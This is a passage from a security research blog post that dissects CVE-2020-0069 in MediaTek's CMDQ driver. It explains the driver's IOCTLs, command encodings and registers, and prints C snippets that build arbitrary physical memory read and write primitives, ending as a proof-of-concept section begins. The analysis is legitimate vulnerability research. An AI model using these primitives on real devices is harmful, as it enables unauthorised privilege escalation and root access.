href=\"http://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html#id7\" id=\"id1\">[1]</a>. This vulnerability had been known by MediaTek since April 2019 (10 months before being fixed), and allows a local attacker without privileges to read and write system memory, leading to privilege escalation. There is even an exploit binary called <tt class=\"docutils literal\"><span class=\"pre\">mtk-su</span></tt> <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html#id8\" id=\"id2\">[2]</a> that allows to root many vulnerable devices, which was developed in 2019. At the time of this writing, only few information about this vulnerability is available. So we decided to take a look for ourselves.</p> \n</div> \n<div class=\"section\" id=\"about-cve-2020-0069\"> \n <h2>About CVE-2020-0069</h2> \n <p>According to MediaTek <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html#id9\" id=\"id3\">[3]</a>, this vulnerability allows a local attacker to achieve arbitrary read/write of physical memory addresses, leading to privilege escalation. The impacted module is the <em>MediaTek Command Queue</em> driver (or CMDQ driver). Using IOCTL on the driver, it is possible for an attacker to allocate a DMA (<em>Direct Memory Access</em>) buffer, and send commands to the DMA hardware in order to have it read and write physical addresses.</p> \n <p>As a reminder, <em>Direct Memory Access</em> is a feature allowing a dedicated hardware to send or receive data directly from or to the main memory (the RAM). The aim is to speed up the system by allowing large memory accesses without using too much of the CPU for such task. This driver seems to allow to communicate from userland with a DMA controller, in order to achieve media or display-related tasks.</p> \n <p>There are more than 10 SoCs (System on Chip) impacted by this vulnerability, and even more devices. We have been able to exploit it on the Xiaomi Redmi 6a device (using a MediaTek MT6762M SoC).</p> \n</div> \n<div class=\"section\" id=\"the-cmdq-driver\"> \n <h2>The CMDQ driver</h2> \n <p>There are several versions of sources for this driver available on the web. For this study, we have mainly looked into the Xiaomi Redmi 6a open source kernel <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html#id10\" id=\"id4\">[4]</a>. The driver implementation can be found in <em>drivers/misc/mediatek/cmdq</em>. The associated device driver can be either <em>/dev/mtk-cmdq</em> or <em>/proc/mtk-cmdq</em> depending on the SoC and is available to any application without any permission (at least on the vulnerable devices).</p> \n <p>As said before, the driver can be controlled by userland using the IOCTL syscall.</p> \n <div class=\"highlight\"> \n  <pre><span></span><span class=\"cp\">#define CMDQ_IOCTL_EXEC_COMMAND _IOW(CMDQ_IOCTL_MAGIC_NUMBER, 3, \\</span>\n<span class=\"cp\">    struct cmdqCommandStruct)</span>\n<span class=\"cp\">#define CMDQ_IOCTL_QUERY_USAGE  _IOW(CMDQ_IOCTL_MAGIC_NUMBER, 4, \\</span>\n<span class=\"cp\">    struct cmdqUsageInfoStruct)</span>\n\n<span class=\"cm\">/*  */</span>\n<span class=\"cm\">/* Async operations */</span>\n<span class=\"cm\">/*  */</span>\n\n<span class=\"cp\">#define CMDQ_IOCTL_ASYNC_JOB_EXEC _IOW(CMDQ_IOCTL_MAGIC_NUMBER, 5, \\</span>\n<span class=\"cp\">    struct cmdqJobStruct)</span>\n<span class=\"cp\">#define CMDQ_IOCTL_ASYNC_JOB_WAIT_AND_CLOSE _IOR(CMDQ_IOCTL_MAGIC_NUMBER, 6, \\</span>\n<span class=\"cp\">    struct cmdqJobResultStruct)</span>\n\n<span class=\"cp\">#define CMDQ_IOCTL_ALLOC_WRITE_ADDRESS _IOW(CMDQ_IOCTL_MAGIC_NUMBER, 7, \\</span>\n<span class=\"cp\">    struct cmdqWriteAddressStruct)</span>\n<span class=\"cp\">#define CMDQ_IOCTL_FREE_WRITE_ADDRESS _IOW(CMDQ_IOCTL_MAGIC_NUMBER, 8, \\</span>\n<span class=\"cp\">    struct cmdqWriteAddressStruct)</span>\n<span class=\"cp\">#define CMDQ_IOCTL_READ_ADDRESS_VALUE _IOW(CMDQ_IOCTL_MAGIC_NUMBER, 9, \\</span>\n<span class=\"cp\">    struct cmdqReadAddressStruct)</span>\n</pre> \n </div> \n <p>From the available operations, we are going to look into the following ones:</p> \n <ul class=\"simple\"> \n  <li><tt class=\"docutils literal\">CMDQ_IOCTL_ALLOC_WRITE_ADDRESS</tt> is used to allocate a DMA buffer, and takes a <tt class=\"docutils literal\">struct cmdqWriteAddressStruct</tt> as argument;</li> \n  <li><tt class=\"docutils literal\">CMDQ_IOCTL_FREE_WRITE_ADDRESS</tt> is used to free a previously allocated DMA buffer;</li> \n  <li><tt class=\"docutils literal\">CMDQ_IOCTL_EXEC_COMMAND</tt> allows to send a command buffer to the DMA controller and takes a <tt class=\"docutils literal\">struct cmdqCommandStruct</tt> as argument;</li> \n  <li><tt class=\"docutils literal\">CMDQ_IOCTL_READ_ADDRESS_VALUE</tt> can be used to read DMA buffer values.</li> \n </ul> \n <div class=\"section\" id=\"allocating-a-dma-buffer\"> \n  <h3>Allocating a DMA buffer</h3> \n  <p>When calling <tt class=\"docutils literal\">CMDQ_IOCTL_ALLOC_WRITE_ADDRESS</tt>, we provide a <tt class=\"docutils literal\">struct cmdqWriteAddressStruct</tt> containing the size of the requested buffer in the field <tt class=\"docutils literal\">count</tt>. We receive a physical address in the field <tt class=\"docutils literal\">startPA</tt>. We cannot access this address directly from the userland. To access this memory area, we can use <tt class=\"docutils literal\">CMDQ_IOCTL_EXEC_COMMAND</tt>.</p> \n  <p>It is possible to free a DMA buffer, by calling <tt class=\"docutils literal\">CMDQ_IOCTL_FREE_WRITE_ADDRESS</tt> with the <tt class=\"docutils literal\">struct cmdqWriteAddressStruct</tt> structure from the previous allocation.</p> \n </div> \n <div class=\"section\" id=\"executing-commands\"> \n  <h3>Executing commands</h3> \n  <p><tt class=\"docutils literal\">CMDQ_IOCTL_EXEC_COMMAND</tt> takes a <tt class=\"docutils literal\">struct cmdqCommandStruct</tt> as parameter.</p> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"k\">struct</span> <span class=\"n\">cmdqCommandStruct</span> <span class=\"p\">{</span>\n <span class=\"p\">[...]</span>\n <span class=\"cm\">/* [IN] pointer to instruction buffer. Use 64-bit for compatibility. */</span>\n <span class=\"cm\">/* This must point to an 64-bit aligned u32 array */</span>\n <span class=\"n\">cmdqU32Ptr_t</span> <span class=\"n\">pVABase</span><span class=\"p\">;</span>\n <span class=\"cm\">/* [IN] size of instruction buffer, in bytes. */</span>\n <span class=\"n\">u32</span> <span class=\"n\">blockSize</span><span class=\"p\">;</span>\n <span class=\"cm\">/* [IN] request to read register values at the end of command */</span>\n <span class=\"k\">struct</span> <span class=\"n\">cmdqReadRegStruct</span> <span class=\"n\">regRequest</span><span class=\"p\">;</span>\n <span class=\"cm\">/* [OUT] register values of regRequest */</span>\n <span class=\"k\">struct</span> <span class=\"n\">cmdqRegValueStruct</span> <span class=\"n\">regValue</span><span class=\"p\">;</span>\n <span class=\"cm\">/* [IN/OUT] physical addresses to read value */</span>\n <span class=\"k\">struct</span> <span class=\"n\">cmdqReadAddressStruct</span> <span class=\"n\">readAddress</span><span class=\"p\">;</span>\n <span class=\"p\">[...]</span>\n</pre> \n  </div> \n  <p>As said before, this IOCTL allows to send commands to be executed by the DMA controller. These commands are placed in a userland buffer, whose address has to be put in the field <tt class=\"docutils literal\">pVABase</tt> and its size in the field <tt class=\"docutils literal\">blockSize</tt>.</p> \n  <p>The field <tt class=\"docutils literal\">readAddress</tt> from the command struct can be used to read values from the DMA buffer after the execution of our commands. The field <tt class=\"docutils literal\">readAddress.dmaAddresses</tt> points to a userland buffer which contains addresses from our DMA buffer. Its size is referenced by the field <tt class=\"docutils literal\">readAddress.count</tt>. All the addresses will be read by the kernel and the values will be placed in the userland buffer pointed by the field <tt class=\"docutils literal\">readAddress.values</tt>.</p> \n  <p>Reading the DMA buffer can also be achieved by using the IOCTL command <tt class=\"docutils literal\">CMDQ_IOCTL_READ_ADDRESS_VALUE</tt>.</p> \n </div> \n <div class=\"section\" id=\"commands-description\"> \n  <h3>Commands description</h3> \n  <p>A command consists of two 32-bit words and is identified by a command code.</p> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"k\">enum</span> <span class=\"n\">cmdq_code</span> <span class=\"p\">{</span>\n <span class=\"n\">CMDQ_CODE_READ</span>  <span class=\"o\">=</span> <span class=\"mh\">0x01</span><span class=\"p\">,</span>\n <span class=\"n\">CMDQ_CODE_MASK</span> <span class=\"o\">=</span> <span class=\"mh\">0x02</span><span class=\"p\">,</span>\n <span class=\"n\">CMDQ_CODE_MOVE</span> <span class=\"o\">=</span> <span class=\"mh\">0x02</span><span class=\"p\">,</span>\n <span class=\"n\">CMDQ_CODE_WRITE</span> <span class=\"o\">=</span> <span class=\"mh\">0x04</span><span class=\"p\">,</span>\n <span class=\"n\">CMDQ_CODE_POLL</span>  <span class=\"o\">=</span> <span class=\"mh\">0x08</span><span class=\"p\">,</span>\n <span class=\"n\">CMDQ_CODE_JUMP</span> <span class=\"o\">=</span> <span class=\"mh\">0x10</span><span class=\"p\">,</span>\n <span class=\"n\">CMDQ_CODE_WFE</span> <span class=\"o\">=</span> <span class=\"mh\">0x20</span><span class=\"p\">,</span>\n <span class=\"n\">CMDQ_CODE_EOC</span> <span class=\"o\">=</span> <span class=\"mh\">0x40</span><span class=\"p\">,</span>\n <span class=\"p\">[...]</span>\n</pre> \n  </div> \n  <p>Here is a description of some commands we are going to use.</p> \n  <div class=\"section\" id=\"cmdq-code-write-and-cmdq-code-read\"> \n   <h4>CMDQ_CODE_WRITE and CMDQ_CODE_READ</h4> \n   <img alt=\"READ and WRITE commands format\" src=\"http://blog.quarkslab.com/resources/2020-03-23_mediatek-cve-2020-0069/rw_command.png\" style=\"width: 510.59999999999997px; height: 296.4px;\" /> \n   <p>The write command is used to write a value from a data register at the address from the address register. The read command reads the value at the address pointed by the address register and places the result into the data register.</p> \n   <!-- optional --> \n   <p>Depending on the option bits (<tt class=\"docutils literal\">TYPE A</tt> and <tt class=\"docutils literal\">TYPE B</tt> in the figure), the address can be computed from a value called <tt class=\"docutils literal\">subsysID</tt> placed in the <tt class=\"docutils literal\">REG NUMBER</tt> field and an offset placed in the <tt class=\"docutils literal\">VALUE</tt> field. The <tt class=\"docutils literal\">subsysID</tt> will then be replaced by an actual physical address referenced in the kernel DTS.</p> \n  </div> \n  <div class=\"section\" id=\"cmdq-code-move\"> \n   <h4>CMDQ_CODE_MOVE</h4> \n   <img alt=\"MOVE command format\" src=\"http://blog.quarkslab.com/resources/2020-03-23_mediatek-cve-2020-0069/move_command.png\" style=\"width: 510.59999999999997px; height: 296.4px;\" /> \n   <p>This command allows to place a value (up to 48 bits) into a register. This value can be placed either in a data register or address register, and can be any data or an address. This is probably the biggest issue here since no checks are made on the address.</p> \n  </div> \n  <div class=\"section\" id=\"cmdq-code-wfe\"> \n   <h4>CMDQ_CODE_WFE</h4> \n   <img alt=\"WFE command format\" src=\"http://blog.quarkslab.com/resources/2020-03-23_mediatek-cve-2020-0069/wfe_command.png\" style=\"width: 510.59999999999997px; height: 296.4px;\" /> \n   <p>WFE stands for <em>Wait For Event and clear</em>. From what we understand, we can use it to block the usage of some registers (pretty much like we would use a mutex). The event flag to be used with this command is associated with a set of registers we are going to use in the command buffer. For example, for the registers <tt class=\"docutils literal\">CMDQ_DATA_REG_DEBUG</tt> (R7) and <tt class=\"docutils literal\">CMDQ_DATA_REG_DEBUG_DST</tt> (P11), the event (or token as it is called in the sources) <tt class=\"docutils literal\">CMDQ_SYNC_TOKEN_GPR_SET_4</tt> has to be used. We need to use the WFE command at the beginning and at the end of each command buffer.</p> \n  </div> \n  <div class=\"section\" id=\"cmdq-code-eoc\"> \n   <h4>CMDQ_CODE_EOC</h4> \n   <p>EOC stands for <em>End Of Command</em>. It has to be placed at the end of each command buffer, after the <strong>CMDQ_CODE_WFE</strong> command, to indicate the end of the command list. It seems to contain a lot of flags but for our usage we only needed what seems to be the IRQ flag always to be set.</p> \n  </div> \n  <div class=\"section\" id=\"cmdq-code-jump\"> \n   <h4>CMDQ_CODE_JUMP</h4> \n   <p>According to the sources comments, it allows to jump into the command buffer by using an offset. We use this command at the very end of each command buffer, after the command <strong>CMDQ_CODE_EOC</strong>, always to jump at the offset 0x8, i.e. on the previous command. Our theory is that a prefetch mechanism is implemented in the DMA controller, and this command makes sure to take the <strong>CMDQ_CODE_EOC</strong> command into account.</p> \n  </div> \n </div> \n <div class=\"section\" id=\"the-registers\"> \n  <h3>The registers</h3> \n  <p>In the command descriptions, we mentioned registers. There are two kinds of registers:</p> \n  <ul class=\"simple\"> \n   <li>value registers (from R0 to R15) that are composed of 32 bits;</li> \n   <li>address registers (from P0 to P7) that are composed of 64 bits.</li> \n  </ul> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"k\">enum</span> <span class=\"n\">cmdq_gpr_reg</span> <span class=\"p\">{</span>\n    <span class=\"cm\">/* Value Reg, we use 32-bit */</span>\n    <span class=\"cm\">/* Address Reg, we use 64-bit */</span>\n    <span class=\"cm\">/* Note that R0-R15 and P0-P7 actually share same memory */</span>\n    <span class=\"cm\">/* and R1 cannot be used. */</span>\n\n    <span class=\"n\">CMDQ_DATA_REG_JPEG</span> <span class=\"o\">=</span> <span class=\"mh\">0x00</span><span class=\"p\">,</span>  <span class=\"cm\">/* R0 */</span>\n    <span class=\"n\">CMDQ_DATA_REG_JPEG_DST</span> <span class=\"o\">=</span> <span class=\"mh\">0x11</span><span class=\"p\">,</span>  <span class=\"cm\">/* P1 */</span>\n\n    <span class=\"n\">CMDQ_DATA_REG_PQ_COLOR</span> <span class=\"o\">=</span> <span class=\"mh\">0x04</span><span class=\"p\">,</span>  <span class=\"cm\">/* R4 */</span>\n    <span class=\"n\">CMDQ_DATA_REG_PQ_COLOR_DST</span> <span class=\"o\">=</span> <span class=\"mh\">0x13</span><span class=\"p\">,</span>  <span class=\"cm\">/* P3 */</span>\n\n    <span class=\"n\">CMDQ_DATA_REG_2D_SHARPNESS_0</span> <span class=\"o\">=</span> <span class=\"mh\">0x05</span><span class=\"p\">,</span>    <span class=\"cm\">/* R5 */</span>\n    <span class=\"n\">CMDQ_DATA_REG_2D_SHARPNESS_0_DST</span> <span class=\"o\">=</span> <span class=\"mh\">0x14</span><span class=\"p\">,</span>    <span class=\"cm\">/* P4 */</span>\n\n    <span class=\"n\">CMDQ_DATA_REG_2D_SHARPNESS_1</span> <span class=\"o\">=</span> <span class=\"mh\">0x0a</span><span class=\"p\">,</span>    <span class=\"cm\">/* R10 */</span>\n    <span class=\"n\">CMDQ_DATA_REG_2D_SHARPNESS_1_DST</span> <span class=\"o\">=</span> <span class=\"mh\">0x16</span><span class=\"p\">,</span>    <span class=\"cm\">/* P6 */</span>\n\n    <span class=\"n\">CMDQ_DATA_REG_DEBUG</span> <span class=\"o\">=</span> <span class=\"mh\">0x0b</span><span class=\"p\">,</span> <span class=\"cm\">/* R11 */</span>\n    <span class=\"n\">CMDQ_DATA_REG_DEBUG_DST</span> <span class=\"o\">=</span> <span class=\"mh\">0x17</span><span class=\"p\">,</span> <span class=\"cm\">/* P7 */</span>\n</pre> \n  </div> \n </div> \n</div> \n<div class=\"section\" id=\"let-s-play-with-the-driver\"> \n <h2>Let's play with the driver</h2> \n <p>Now that we understand a bit better how the driver works, let's play with it in order to achieve basic memory reads and writes.</p> \n <div class=\"section\" id=\"writing-memory\"> \n  <h3>Writing memory</h3> \n  <p>To write a 32-bit value in memory we can use the following commands:</p> \n  <ul class=\"simple\"> \n   <li>MOVE a 32 bit value into the value register;</li> \n   <li>MOVE the address where we want to put our value into the address register;</li> \n   <li>WRITE the value from the value register at the address from the address register.</li> \n  </ul> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"c1\">// move value into CMDQ_DATA_REG_DEBUG</span>\n<span class=\"o\">*</span><span class=\"p\">(</span><span class=\"kt\">uint32_t</span><span class=\"o\">*</span><span class=\"p\">)(</span><span class=\"n\">command</span><span class=\"o\">-&gt;</span><span class=\"n\">pVABase</span> <span class=\"o\">+</span> <span class=\"n\">command</span><span class=\"o\">-&gt;</span><span class=\"n\">blockSize</span><span class=\"p\">)</span> <span class=\"o\">=</span> <span class=\"n\">value</span><span class=\"p\">;</span>\n<span class=\"o\">*</span><span class=\"p\">(</span><span class=\"kt\">uint32_t</span><span class=\"o\">*</span><span class=\"p\">)(</span><span class=\"n\">command</span><span class=\"o\">-&gt;</span><span class=\"n\">pVABase</span> <span class=\"o\">+</span> <span class=\"n\">command</span><span class=\"o\">-&gt;</span><span class=\"n\">blockSize</span> <span class=\"o\">+</span> <span class=\"mi\">4</span><span class=\"p\">)</span> <span class=\"o\">=</span> <span class=\"n\">CMDQ_CODE_MOVE</span> <span class=\"o\">&lt;&lt;</span> <span class=\"mi\">24</span> <span class=\"o\">|</span> <span class=\"mi\">1</span> <span class=\"o\">&lt;&lt;</span> <span class=\"mi\">23</span>\n                                                <span class=\"o\">|</span> <span class=\"n\">CMDQ_DATA_REG_DEBUG</span> <span class=\"o\">&lt;&lt;</span> <span class=\"mi\">16</span>\n                                                <span class=\"o\">|</span> <span class=\"p\">(</span><span class=\"n\">pa_address</span> <span class=\"o\">+</span> <span class=\"n\">offset</span><span class=\"p\">)</span> <span class=\"o\">&gt;&gt;</span> <span class=\"mh\">0x20</span><span class=\"p\">;</span>\n<span class=\"n\">command</span><span class=\"o\">-&gt;</span><span class=\"n\">blockSize</span> <span class=\"o\">+=</span> <span class=\"mi\">8</span><span class=\"p\">;</span>\n\n<span class=\"c1\">// move pa_address into CMDQ_DATA_REG_DEBUG_DST</span>\n<span class=\"o\">*</span><span class=\"p\">(</span><span class=\"kt\">uint32_t</span><span class=\"o\">*</span><span class=\"p\">)(</span><span class=\"n\">command</span><span class=\"o\">-&gt;</span><span class=\"n\">pVABase</span> <span class=\"o\">+</span> <span class=\"n\">command</span><span class=\"o\">-&gt;</span><span class=\"n\">blockSize</span><span class=\"p\">)</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"kt\">uint32_t</span><span class=\"p\">)</span><span class=\"n\">pa_address</span><span class=\"p\">;</span>\n<span class=\"o\">*</span><span class=\"p\">(</span><span class=\"kt\">uint32_t</span><span class=\"o\">*</span><span class=\"p\">)(</span><span class=\"n\">command</span><span class=\"o\">-&gt;</span><span class=\"n\">pVABase</span> <span class=\"o\">+</span> <span class=\"n\">command</span><span class=\"o\">-&gt;</span><span class=\"n\">blockSize</span> <span class=\"o\">+</span> <span class=\"mi\">4</span><span class=\"p\">)</span> <span class=\"o\">=</span> <span class=\"n\">CMDQ_CODE_MOVE</span> <span class=\"o\">&lt;&lt;</span> <span class=\"mi\">24</span> <span class=\"o\">|</span> <span class=\"mi\">1</span> <span class=\"o\">&lt;&lt;</span> <span class=\"mi\">23</span>\n                                                <span class=\"o\">|</span> <span class=\"n\">CMDQ_DATA_REG_DEBUG_DST</span> <span class=\"o\">&lt;&lt;</span> <span class=\"mi\">16</span>\n                                                <span class=\"o\">|</span> <span class=\"p\">(</span><span class=\"n\">pa_address</span> <span class=\"o\">+</span> <span class=\"n\">offset</span><span class=\"p\">)</span> <span class=\"o\">&gt;&gt;</span> <span class=\"mh\">0x20</span><span class=\"p\">;</span>\n<span class=\"n\">command</span><span class=\"o\">-&gt;</span><span class=\"n\">blockSize</span> <span class=\"o\">+=</span> <span class=\"mi\">8</span><span class=\"p\">;</span>\n\n<span class=\"c1\">//write CMDQ_DATA_REG_DEBUG into CMDQ_DATA_REG_DEBUG_DST</span>\n<span class=\"o\">*</span><span class=\"p\">(</span><span class=\"kt\">uint32_t</span><span class=\"o\">*</span><span class=\"p\">)(</span><span class=\"n\">command</span><span class=\"o\">-&gt;</span><span class=\"n\">pVABase</span> <span class=\"o\">+</span> <span class=\"n\">command</span><span class=\"o\">-&gt;</span><span class=\"n\">blockSize</span><span class=\"p\">)</span> <span class=\"o\">=</span> <span class=\"n\">CMDQ_DATA_REG_DEBUG</span><span class=\"p\">;</span>\n<span class=\"o\">*</span><span class=\"p\">(</span><span class=\"kt\">uint32_t</span><span class=\"o\">*</span><span class=\"p\">)(</span><span class=\"n\">command</span><span class=\"o\">-&gt;</span><span class=\"n\">pVABase</span> <span class=\"o\">+</span> <span class=\"n\">command</span><span class=\"o\">-&gt;</span><span class=\"n\">blockSize</span> <span class=\"o\">+</span> <span class=\"mi\">4</span><span class=\"p\">)</span> <span class=\"o\">=</span> <span class=\"n\">CMDQ_CODE_WRITE</span> <span class=\"o\">&lt;&lt;</span> <span class=\"mi\">24</span> <span class=\"o\">|</span> <span class=\"mi\">3</span> <span class=\"o\">&lt;&lt;</span> <span class=\"mi\">22</span>\n                                                <span class=\"o\">|</span> <span class=\"n\">CMDQ_DATA_REG_DEBUG_DST</span> <span class=\"o\">&lt;&lt;</span> <span class=\"mi\">16</span><span class=\"p\">;</span>\n<span class=\"n\">command</span><span class=\"o\">-&gt;</span><span class=\"n\">blockSize</span> <span class=\"o\">+=</span> <span class=\"mi\">8</span><span class=\"p\">;</span>\n</pre> \n  </div> \n </div> \n <div class=\"section\" id=\"reading-memory\"> \n  <h3>Reading memory</h3> \n  <p>Reading a 32-bit value in memory can be done in four commands:</p> \n  <ul class=\"simple\"> \n   <li>MOVE the address to be read (<tt class=\"docutils literal\">pa_address</tt>) into the address register;</li> \n   <li>READ the data at the address pointed by the address register into the value register;</li> \n   <li>MOVE the DMA buffer address (<tt class=\"docutils literal\">dma_address</tt>) into the address register;</li> \n   <li>WRITE the data from the value register into the address from the address register .</li> \n  </ul> \n  <p>We need to place these commands in a previously allocated buffer in the <tt class=\"docutils literal\">pVABase</tt> field of the <tt class=\"docutils literal\">struct cmdqCommandStruct</tt>. The command buffer size has to be put in the field <tt class=\"docutils literal\">blockSize</tt>.</p> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"c1\">// move pa_address into CMDQ_DATA_REG_DEBUG_DST</span>\n<span class=\"o\">*</span><span class=\"p\">(</span><span class=\"kt\">uint32_t</span><span class=\"o\">*</span><span class=\"p\">)(</span><span class=\"n\">command</span><span class=\"o\">-&gt;</span><span class=\"n\">pVABase</span> <span class=\"o\">+</span> <span class=\"n\">command</span><span class=\"o\">-&gt;</span><span class=\"n\">blockSize</span><span class=\"p\">)</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"kt\">uint32_t</span><span class=\"p\">)</span><span class=\"n\">pa_address</span><span class=\"p\">;</span>\n<span class=\"o\">*</span><span class=\"p\">(</span><span class=\"kt\">uint32_t</span><span class=\"o\">*</span><span class=\"p\">)(</span><span class=\"n\">command</span><span class=\"o\">-&gt;</span><span class=\"n\">pVABase</span> <span class=\"o\">+</span> <span class=\"n\">command</span><span class=\"o\">-&gt;</span><span class=\"n\">blockSize</span> <span class=\"o\">+</span> <span class=\"mi\">4</span><span class=\"p\">)</span> <span class=\"o\">=</span> <span class=\"n\">CMDQ_CODE_MOVE</span> <span class=\"o\">&lt;&lt;</span> <span class=\"mi\">24</span> <span class=\"o\">|</span> <span class=\"mi\">1</span> <span class=\"o\">&lt;&lt;</span> <span class=\"mi\">23</span>\n                                                <span class=\"o\">|</span> <span class=\"n\">CMDQ_DATA_REG_DEBUG_DST</span> <span class=\"o\">&lt;&lt;</span> <span class=\"mi\">16</span>\n                                                <span class=\"o\">|</span> <span class=\"p\">(</span><span class=\"n\">pa_address</span> <span class=\"o\">+</span> <span class=\"n\">offset</span><span class=\"p\">)</span> <span class=\"o\">&gt;&gt;</span> <span class=\"mh\">0x20</span><span class=\"p\">;</span>\n<span class=\"n\">command</span><span class=\"o\">-&gt;</span><span class=\"n\">blockSize</span> <span class=\"o\">+=</span> <span class=\"mi\">8</span><span class=\"p\">;</span>\n\n<span class=\"c1\">// read value at CMDQ_DATA_REG_DEBUG_DST into CMDQ_DATA_REG_DEBUG</span>\n<span class=\"o\">*</span><span class=\"p\">(</span><span class=\"kt\">uint32_t</span><span class=\"o\">*</span><span class=\"p\">)(</span><span class=\"n\">command</span><span class=\"o\">-&gt;</span><span class=\"n\">pVABase</span> <span class=\"o\">+</span> <span class=\"n\">command</span><span class=\"o\">-&gt;</span><span class=\"n\">blockSize</span><span class=\"p\">)</span> <span class=\"o\">=</span> <span class=\"n\">CMDQ_DATA_REG_DEBUG</span><span class=\"p\">;</span>\n<span class=\"o\">*</span><span class=\"p\">(</span><span class=\"kt\">uint32_t</span><span class=\"o\">*</span><span class=\"p\">)(</span><span class=\"n\">command</span><span class=\"o\">-&gt;</span><span class=\"n\">pVABase</span> <span class=\"o\">+</span> <span class=\"n\">command</span><span class=\"o\">-&gt;</span><span class=\"n\">blockSize</span> <span class=\"o\">+</span> <span class=\"mi\">4</span><span class=\"p\">)</span> <span class=\"o\">=</span> <span class=\"n\">CMDQ_CODE_READ</span> <span class=\"o\">&lt;&lt;</span> <span class=\"mi\">24</span> <span class=\"o\">|</span> <span class=\"mi\">3</span> <span class=\"o\">&lt;&lt;</span> <span class=\"mi\">22</span>\n                                                  <span class=\"o\">|</span> <span class=\"n\">CMDQ_DATA_REG_DEBUG_DST</span> <span class=\"o\">&lt;&lt;</span> <span class=\"mi\">16</span><span class=\"p\">;</span>\n<span class=\"n\">command</span><span class=\"o\">-&gt;</span><span class=\"n\">blockSize</span> <span class=\"o\">+=</span> <span class=\"mi\">8</span><span class=\"p\">;</span>\n\n<span class=\"c1\">// move dma_address into CMDQ_DATA_REG_DEBUG_DST</span>\n<span class=\"o\">*</span><span class=\"p\">(</span><span class=\"kt\">uint32_t</span><span class=\"o\">*</span><span class=\"p\">)(</span><span class=\"n\">command</span><span class=\"o\">-&gt;</span><span class=\"n\">pVABase</span> <span class=\"o\">+</span> <span class=\"n\">command</span><span class=\"o\">-&gt;</span><span class=\"n\">blockSize</span><span class=\"p\">)</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"kt\">uint32_t</span><span class=\"p\">)</span><span class=\"n\">dma_address</span><span class=\"p\">;</span>\n<span class=\"o\">*</span><span class=\"p\">(</span><span class=\"kt\">uint32_t</span><span class=\"o\">*</span><span class=\"p\">)(</span><span class=\"n\">command</span><span class=\"o\">-&gt;</span><span class=\"n\">pVABase</span> <span class=\"o\">+</span> <span class=\"n\">command</span><span class=\"o\">-&gt;</span><span class=\"n\">blockSize</span> <span class=\"o\">+</span> <span class=\"mi\">4</span><span class=\"p\">)</span> <span class=\"o\">=</span> <span class=\"n\">CMDQ_CODE_MOVE</span> <span class=\"o\">&lt;&lt;</span> <span class=\"mi\">24</span> <span class=\"o\">|</span> <span class=\"mi\">1</span> <span class=\"o\">&lt;&lt;</span> <span class=\"mi\">23</span>\n                                                <span class=\"o\">|</span> <span class=\"n\">CMDQ_DATA_REG_DEBUG_DST</span> <span class=\"o\">&lt;&lt;</span> <span class=\"mi\">16</span>\n                                                <span class=\"o\">|</span> <span class=\"p\">(</span><span class=\"n\">pa_address</span> <span class=\"o\">+</span> <span class=\"n\">offset</span><span class=\"p\">)</span> <span class=\"o\">&gt;&gt;</span> <span class=\"mh\">0x20</span><span class=\"p\">;</span>\n<span class=\"n\">command</span><span class=\"o\">-&gt;</span><span class=\"n\">blockSize</span> <span class=\"o\">+=</span> <span class=\"mi\">8</span><span class=\"p\">;</span>\n\n<span class=\"c1\">//write CMDQ_DATA_REG_DEBUG into CMDQ_DATA_REG_DEBUG_DST</span>\n<span class=\"o\">*</span><span class=\"p\">(</span><span class=\"kt\">uint32_t</span><span class=\"o\">*</span><span class=\"p\">)(</span><span class=\"n\">command</span><span class=\"o\">-&gt;</span><span class=\"n\">pVABase</span> <span class=\"o\">+</span> <span class=\"n\">command</span><span class=\"o\">-&gt;</span><span class=\"n\">blockSize</span><span class=\"p\">)</span> <span class=\"o\">=</span> <span class=\"n\">CMDQ_DATA_REG_DEBUG</span><span class=\"p\">;</span>\n<span class=\"o\">*</span><span class=\"p\">(</span><span class=\"kt\">uint32_t</span><span class=\"o\">*</span><span class=\"p\">)(</span><span class=\"n\">command</span><span class=\"o\">-&gt;</span><span class=\"n\">pVABase</span> <span class=\"o\">+</span> <span class=\"n\">command</span><span class=\"o\">-&gt;</span><span class=\"n\">blockSize</span> <span class=\"o\">+</span> <span class=\"mi\">4</span><span class=\"p\">)</span> <span class=\"o\">=</span> <span class=\"n\">CMDQ_CODE_WRITE</span> <span class=\"o\">&lt;&lt;</span> <span class=\"mi\">24</span> <span class=\"o\">|</span> <span class=\"mi\">3</span> <span class=\"o\">&lt;&lt;</span> <span class=\"mi\">22</span>\n                                                  <span class=\"o\">|</span> <span class=\"n\">CMDQ_DATA_REG_DEBUG_DST</span> <span class=\"o\">&lt;&lt;</span> <span class=\"mi\">16</span><span class=\"p\">;</span>\n</pre> \n  </div> \n  <p>Then we inform the driver that we want to read the values in the DMA buffer by filling the <tt class=\"docutils literal\">readAddress</tt> field:</p> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"o\">*</span><span class=\"p\">(</span><span class=\"kt\">uint32_t</span><span class=\"o\">*</span><span class=\"p\">)((</span><span class=\"kt\">uint32_t</span><span class=\"p\">)</span><span class=\"n\">command</span><span class=\"o\">-&gt;</span><span class=\"n\">readAddress</span><span class=\"p\">.</span><span class=\"n\">dmaAddresses</span><span class=\"p\">)</span> <span class=\"o\">=</span> <span class=\"n\">dma_address</span><span class=\"p\">;</span>\n<span class=\"n\">command</span><span class=\"o\">-&gt;</span><span class=\"n\">readAddress</span><span class=\"p\">.</span><span class=\"n\">count</span> <span class=\"o\">=</span> <span class=\"n\">offset</span><span class=\"p\">;</span>\n</pre> \n  </div> \n  <p>The result will be written in <tt class=\"docutils literal\">readAddress.values</tt>, which has to be allocated before.</p> \n </div> \n <div class=\"section\" id=\"small-poc\"> \n  <h3>Small PoC</h3> \n  <p>To identify the physical 